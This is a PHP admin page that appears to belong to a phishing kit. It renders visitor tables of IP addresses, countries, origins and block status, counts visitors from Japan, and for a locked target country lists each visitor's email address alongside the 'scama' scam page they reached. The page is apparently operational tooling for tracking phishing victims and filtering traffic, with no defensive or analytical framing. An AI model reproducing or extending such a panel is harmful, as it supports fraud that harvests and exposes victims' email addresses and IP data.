<?php
$get_country = json_decode(file_get_contents("../core/country.json"), true);
$get_codeCountry = json_decode(file_get_contents("../core/code_country.json"), true);
include('template/header.php');
?>

<!-- Page Sidebar Ends-->
<div class="container">
    <div class="col-lg-12 mb-2">
        <a href="#" class="link-clear clearz">
            <div class="card-clear">
                <h4 class="text-center text-uppercase">clear</h4>
            </div>
        </a>
    </div>
    <div class="row">
        <div class="col-sm-12 mb-4">
            <div class="card-status">
                <div class="img-sagiri-side">
                    <img class="img-losa" src="https://linkpirbadi.b-cdn.net/assets/img/hot.png" alt="sagiri">
                </div>
                <div class="status-blam">
                    <h5 class="card-title mb-4">Visitor <span class="badge bg-secondary"><?= $visitors = count(getVisitor()); ?></span>
                    </h5>
                    <hr>
                    <table id="visitor" class="table  table-hover table-fixed-header" style="width: 100%;">
                        <thead>
                            <tr>
                                <th>Ips</th>
                                <th>Country</th>
                                <th>Origin</th>
                                <th>Blocked</th>
                                <th>Date</th>
                            </tr>
                        </thead>
                        <tbody>
                            <?php

                            $visitors = getVisitor();
                            foreach ($visitors as $value) {
                                $ip = $value['ips'];
                                $code_country = $value['code_country'];
                                $country = $value['country'];
                                $origin = $value['origin'];
                                $blocked = $value['blocked'];
                                $date = $value['date'];
                            ?>
                                <tr>
                                    <td><?= $ip ?></td>
                                    <td><img style="width: 20px;" src="https://svg-database.b-cdn.net/flag/<?= $code_country ?>.svg">
                                        <?= $country ?></td>
                                    <td><?= $origin ?></td>
                                    <td><?= $blocked ?></td>
                                    <td><?= $date ?></td>
                                </tr>
                            <?php
                            } ?>
                        </tbody>
                    </table>
                </div>
            </div>
        </div>
        <div class="col-sm-12">
            <div class="card-settings">
                <div class="img-sagiri-side">
                    <img class="img-losa" src="https://linkpirbadi.b-cdn.net/assets/img/sekolah.png" alt="sagiri">
                </div>
                <div class="status-blam">
                    <div class="row">
                        <div class="col-lg-6">
                            <h5 class="card-title mb-4">Visitor JP <span class="badge bg-primary">
                                    <?php $visitor = getVisitor();
                                    $count = 0;
                                    foreach ($visitor as $key => $value) {
                                        if ($value['code_country'] == 'JP') {
                                            $count++;
                                        }
                                    }
                                    echo $count; ?>
                                </span>
                            </h5>
                        </div>
                    </div>
                    <hr>
                    <table id="country" class="table  table-hover table-fixed-header" style="width: 100%; font-size:12px;">
                        <thead>
                            <tr>
                                <th>Ips</th>
                                <th>Country</th>
                                <th>Origin</th>
                                <th>scama</th>
                                <th>email</th>
                                <th>Date</th>
                            </tr>
                        </thead>
                        <tbody>
                            <?php
                            $code_country = getCountryLock()[0]['country'];
                            $visit_country = getRealVisitorByCode($code_country);

                            foreach ($visit_country as $value) {
                                $ip = $value['ips'];
                                $code_country = $value['code_country'];
                                $country = $value['country'];
                                $origin = $value['origin'];
                                $scama = $value['scama'];
                                $scama = explode('/', $scama)[2];
                                $email = $value['email'];
                                $date = $value['date'];
                                $blocked = $value['blocked'];
                            ?>
                                <tr>
                                    <td><?= $ip ?></td>
                                    <td><img style="width: 20px;" src="https://svg-database.b-cdn.net/flag/<?= $code_country ?>.svg">
                                        <?= $country ?></td>
                                    <td><?= $origin ?></td>
                                    <td><?= $scama ?></td>
                                    <td><?= $email ?></td>
                                    <td><?= $date ?></td>
                                </tr>
                            <?php
                            }
                            ?>
                        </tbody>
                    </table>
                </div>
            </div>
        </div>
    </div>
</div>
<!-- Container-fluid Ends-->

<?php

include('template/footer.php');

?>